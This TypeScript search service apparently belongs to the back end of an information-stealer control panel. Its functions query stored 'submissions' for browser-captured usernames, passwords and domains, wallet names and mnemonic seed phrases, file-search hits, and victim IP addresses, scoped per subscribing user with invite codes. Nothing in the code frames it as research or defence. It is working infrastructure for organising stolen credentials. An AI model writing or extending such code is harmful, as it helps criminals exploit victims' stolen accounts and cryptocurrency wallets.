import { db } from '../db/connection';
import {
  browserSubmissions,
  filesearchSubmissions,
  walletSubmissions,
  users,
  invites,
} from '../db/schema';
import {
  SearchOptions,
  SearchResult,
  createCombinedSearch,
  createSearchRank,
  buildSearchConditions,
  createSortOrder,
  createBrowserSubmissionSearchText,
  createFilesearchSubmissionSearchText,
  createWalletSubmissionSearchText,
  createUserSearchText,
  createInviteSearchText,
} from '../utils/searchUtils';
import { sql, eq, and, desc } from 'drizzle-orm';
import { Logger } from '../utils/logger';

export class SearchService {
  /**
   * Search browser submissions with full-text search
   */
  static async searchBrowserSubmissions(
    userId: number,
    options: SearchOptions = {},
  ): Promise<SearchResult<any>> {
    try {
      const {
        query = '',
        limit = 50,
        offset = 0,
        sortBy = 'created_at',
        sortOrder = 'desc',
        filters = {},
      } = options;

      // Build search conditions
      const baseConditions = [eq(browserSubmissions.userId, userId)];

      // Handle special case for type filter with multiple values
      let processedFilters = { ...filters };
      if (filters.type && typeof filters.type === 'string' && filters.type.includes(',')) {
        const types = filters.type.split(',').map((t: string) => t.trim());
        delete processedFilters.type;
        baseConditions.push(
          sql`${browserSubmissions.type} IN (${sql.join(
            types.map((t) => sql`${t}`),
            sql`, `,
          )})`,
        );
      }

      let searchCondition;
      if (query.trim()) {
        // Use raw SQL for search_vector since it's not in the Drizzle schema
        const tsvectorColumn = sql`search_vector`;
        // Handle double-encoded JSON data - first parse the string, then extract fields
        const ilikeColumns = [
          sql`${browserSubmissions.browser}`,
          sql`${browserSubmissions.type}`,
          sql`${browserSubmissions.desktopName}`,
          sql`${browserSubmissions.ipAddress}`,
          // Parse the double-encoded JSON and extract fields
          sql`(${browserSubmissions.data}::jsonb->>'url')`,
          sql`(${browserSubmissions.data}::jsonb->>'title')`,
          sql`(${browserSubmissions.data}::jsonb->>'name')`,
          sql`(${browserSubmissions.data}::jsonb->>'username')`,
          sql`(${browserSubmissions.data}::jsonb->>'password')`,
          sql`(${browserSubmissions.data}::jsonb->>'host')`,
          sql`(${browserSubmissions.data}::jsonb->>'domain')`,
          // Also search in the raw data text for broader matching
          sql`${browserSubmissions.data}::text`,
        ];
        searchCondition = createCombinedSearch(tsvectorColumn, ilikeColumns, query);
      }

      const conditions = buildSearchConditions(baseConditions, searchCondition, processedFilters);
      const whereClause = conditions.length > 0 ? and(...conditions) : undefined;

      // Get total count
      const [countResult] = await db
        .select({ count: sql<number>`count(*)` })
        .from(browserSubmissions)
        .where(whereClause);

      const total = countResult.count;

      // Get search results with ranking
      let orderBy;
      if (query.trim()) {
        const rankColumn = createSearchRank(sql`search_vector`, query);
        orderBy = desc(rankColumn);
      } else {
        orderBy = createSortOrder(sortBy, sortOrder);
      }

      const results = await db
        .select()
        .from(browserSubmissions)
        .where(whereClause)
        .orderBy(orderBy)
        .limit(limit)
        .offset(offset);

      return {
        data: results,
        total,
        hasMore: offset + results.length < total,
      };
    } catch (error: any) {
      Logger.error('Error searching browser submissions', { error: error.message });
      throw error;
    }
  }

  /**
   * Search filesearch submissions
   */
  static async searchFilesearchSubmissions(
    userId: number,
    options: SearchOptions = {},
  ): Promise<SearchResult<any>> {
    try {
      const {
        query = '',
        limit = 50,
        offset = 0,
        sortBy = 'created_at',
        sortOrder = 'desc',
        filters = {},
      } = options;

      const baseConditions = [eq(filesearchSubmissions.userId, userId)];

      let searchCondition;
      if (query.trim()) {
        // Use raw SQL for search_vector since it's not in the Drizzle schema
        const tsvectorColumn = sql`search_vector`;
        const ilikeColumns = [
          sql`${filesearchSubmissions.line}`,
          sql`${filesearchSubmissions.pattern}`,
          sql`${filesearchSubmissions.ipAddress}`,
        ];

        searchCondition = createCombinedSearch(tsvectorColumn, ilikeColumns, query);
      }

      const conditions = buildSearchConditions(baseConditions, searchCondition, filters);
      const whereClause = conditions.length > 0 ? and(...conditions) : undefined;

      const [countResult] = await db
        .select({ count: sql<number>`count(*)` })
        .from(filesearchSubmissions)
        .where(whereClause);

      const total = countResult.count;

      let orderBy;
      if (query.trim()) {
        const rankColumn = createSearchRank(sql`search_vector`, query);
        orderBy = desc(rankColumn);
      } else {
        orderBy = createSortOrder(sortBy, sortOrder);
      }

      const results = await db
        .select()
        .from(filesearchSubmissions)
        .where(whereClause)
        .orderBy(orderBy)
        .limit(limit)
        .offset(offset);

      return {
        data: results,
        total,
        hasMore: offset + results.length < total,
      };
    } catch (error: any) {
      Logger.error('Error searching filesearch submissions', { error: error.message });
      throw error;
    }
  }

  /**
   * Search wallet submissions
   */
  static async searchWalletSubmissions(
    userId: number,
    options: SearchOptions = {},
  ): Promise<SearchResult<any>> {
    try {
      const {
        query = '',
        limit = 50,
        offset = 0,
        sortBy = 'created_at',
        sortOrder = 'desc',
        filters = {},
      } = options;

      const baseConditions = [eq(walletSubmissions.userId, userId)];

      let searchCondition;
      if (query.trim()) {
        // Use raw SQL for search_vector since it's not in the Drizzle schema
        const tsvectorColumn = sql`search_vector`;
        const ilikeColumns = [
          sql`${walletSubmissions.wallet}`,
          sql`${walletSubmissions.mnemonic}`,
          sql`${walletSubmissions.ipAddress}`,
        ];

        searchCondition = createCombinedSearch(tsvectorColumn, ilikeColumns, query);
      }

      const conditions = buildSearchConditions(baseConditions, searchCondition, filters);
      const whereClause = conditions.length > 0 ? and(...conditions) : undefined;

      const [countResult] = await db
        .select({ count: sql<number>`count(*)` })
        .from(walletSubmissions)
        .where(whereClause);

      const total = countResult.count;

      let orderBy;
      if (query.trim()) {
        const rankColumn = createSearchRank(sql`search_vector`, query);
        orderBy = desc(rankColumn);
      } else {
        orderBy = createSortOrder(sortBy, sortOrder);
      }

      const results = await db
        .select()
        .from(walletSubmissions)
        .where(whereClause)
        .orderBy(orderBy)
        .limit(limit)
        .offset(offset);

      return {
        data: results,
        total,
        hasMore: offset + results.length < total,
      };
    } catch (error: any) {
      Logger.error('Error searching wallet submissions', { error: error.message });
      throw error;
    }
  }

  /**
   * Search users (admin only)
   */
  static async searchUsers(options: SearchOptions = {}): Promise<SearchResult<any>> {
    try {
      const {
        query = '',
        limit = 50,
        offset = 0,
        sortBy = 'created_at',
        sortOrder = 'desc',
        filters = {},
      } = options;

      const baseConditions: any[] = [];

      let searchCondition;
      if (query.trim()) {
        // Use raw SQL for search_vector since it's not in the Drizzle schema
        const tsvectorColumn = sql`search_vector`;
        const ilikeColumns = [
          sql`${users.username}`,
          sql`${users.accessKey}`,
          sql`${users.ipAddress}`,
        ];

        searchCondition = createCombinedSearch(tsvectorColumn, ilikeColumns, query);
      }

      const conditions = buildSearchConditions(baseConditions, searchCondition, filters);
      const whereClause = conditions.length > 0 ? and(...conditions) : undefined;

      const [countResult] = await db
        .select({ count: sql<number>`count(*)` })
        .from(users)
        .where(whereClause);

      const total = countResult.count;

      let orderBy;
      if (query.trim()) {
        const rankColumn = createSearchRank(sql`search_vector`, query);
        orderBy = desc(rankColumn);
      } else {
        orderBy = createSortOrder(sortBy, sortOrder);
      }

      const results = await db
        .select()
        .from(users)
        .where(whereClause)
        .orderBy(orderBy)
        .limit(limit)
        .offset(offset);

      return {
        data: results,
        total,
        hasMore: offset + results.length < total,
      };
    } catch (error: any) {
      Logger.error('Error searching users', { error: error.message });
      throw error;
    }
  }

  /**
   * Search invites (admin only)
   */
  static async searchInvites(options: SearchOptions = {}): Promise<SearchResult<any>> {
    try {
      const {
        query = '',
        limit = 50,
        offset = 0,
        sortBy = 'created_at',
        sortOrder = 'desc',
        filters = {},
      } = options;

      const baseConditions: any[] = [];

      let searchCondition;
      if (query.trim()) {
        // Use raw SQL for search_vector since it's not in the Drizzle schema
        const tsvectorColumn = sql`search_vector`;
        const ilikeColumns = [sql`${invites.code}`, sql`${invites.subscriptionType}`];

        searchCondition = createCombinedSearch(tsvectorColumn, ilikeColumns, query);
      }

      const conditions = buildSearchConditions(baseConditions, searchCondition, filters);
      const whereClause = conditions.length > 0 ? and(...conditions) : undefined;

      const [countResult] = await db
        .select({ count: sql<number>`count(*)` })
        .from(invites)
        .where(whereClause);

      const total = countResult.count;

      let orderBy;
      if (query.trim()) {
        const rankColumn = createSearchRank(sql`search_vector`, query);
        orderBy = desc(rankColumn);
      } else {
        orderBy = createSortOrder(sortBy, sortOrder);
      }

      const results = await db
        .select()
        .from(invites)
        .where(whereClause)
        .orderBy(orderBy)
        .limit(limit)
        .offset(offset);

      return {
        data: results,
        total,
        hasMore: offset + results.length < total,
      };
    } catch (error: any) {
      Logger.error('Error searching invites', { error: error.message });
      throw error;
    }
  }

  /**
   * Global search across all submission types for a user
   */
  static async globalSearch(
    userId: number,
    options: SearchOptions = {},
  ): Promise<{
    browser: SearchResult<any>;
    filesearch: SearchResult<any>;
    wallet: SearchResult<any>;
  }> {
    try {
      const [browserResults, filesearchResults, walletResults] = await Promise.all([
        this.searchBrowserSubmissions(userId, options),
        this.searchFilesearchSubmissions(userId, options),
        this.searchWalletSubmissions(userId, options),
      ]);

      return {
        browser: browserResults,
        filesearch: filesearchResults,
        wallet: walletResults,
      };
    } catch (error: any) {
      Logger.error('Error in global search', { error: error.message });
      throw error;
    }
  }
}
